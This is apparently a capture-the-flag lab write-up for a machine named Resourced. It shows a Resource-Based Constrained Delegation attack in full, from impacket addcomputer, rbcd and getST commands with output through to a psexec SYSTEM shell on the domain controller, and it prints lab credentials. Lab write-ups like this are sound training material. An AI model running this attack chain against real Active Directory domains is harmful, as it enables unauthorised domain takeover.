#box #RBCD #impacket-addcomputer #impacket-getST #impacket-rbcd #impacket-psexec

Resourced is an easy machine which grants, in its newest version, a foothold that permits us to access the machine in WinRM. With the same user we're able to run Bloodhound and then execute a RBCD attack on the DC with that user, gaining root.

## Foothold

Foothold is quite straight forward since the credentials are already granted at the beginning of the lab. Authenticating to WinRM as `L.Livingstone:SpicySalmonSSS031_` will grant us access to the machine, achieving the local flag

## Privilege Escalation

To perform a privilege escalation, the first thing we must do is executing bloodhound-python to properly check the relationship of our owned target.
By mapping the AD, we realize how the user `L.Livingstone` has `GenericAll` ACE over the Domain Controller. 

By having this permission, we can:
* Add a new evil computer to the AD
* Set the delegate of the ResourceDC to our evil computer
* Requesting a TGT and impersonate the Administrator within the new computer added under our control
### Resource-Based Constraint Delegation Attack (RBCD)

The vector is quite verbose and specific, the following commands must be input in the following order, with the variables set:
#### Add Computer

```bash
impacket-addcomputer -dc-ip 192.168.193.175 -computer-name lapislazzuli -computer-pass 'WowTest' 'resourced.local/L.Livingstone:SpicySalmonSSS031_'

# Output
[*] Successfully added machine account lapislazzuli$ with password WowTest.
```
#### RBCD 

```bash
impacket-rbcd -delegate-to 'RESOURCEDC$' -delegate-from 'lapislazzuli$' -dc-ip 192.168.193.175 -action write 'resourced.local/L.Livingstone:SpicySalmonSSS031_'

# Output
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] lapislazzuli$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     lapislazzuli$   (S-1-5-21-537427935-490066102-1511301751-4101)
```

#### Get ST (Service Ticket - TGT)

```bash
impacket-getST -spn cifs/resourcedc.resourced.local -impersonate Administrator -dc-ip 192.168.193.175 "resourced.local/lapislazzuli:WowTest"

# Output
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

## Impersonating Administrator through the TGT on `ResourceDC.Resourced.Local` with `psexec`

Once enabled the attack, we must now:
* Add the TGT to our `KRB5CCNAME` variable on our attacking machine (supposing it's a Linux machine)
* Impersonate the Administrator within `psexec`
#### Ticket Variable

```bash
export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

### Impersonation with psexec

```bash
KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache; impacket-psexec -dc-ip 192.168.193.175 -target-ip 192.168.193.175 -no-pass -k resourced.local/Administrator@resourcedc.resourced.local

# Output
[*] Requesting shares on 192.168.231.175.....
[*] Found writable share ADMIN$
[*] Uploading file HZoIKUFP.exe
[*] Opening SVCManager on 192.168.231.175.....
[*] Creating service HXPU on 192.168.231.175.....
[*] Starting service HXPU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
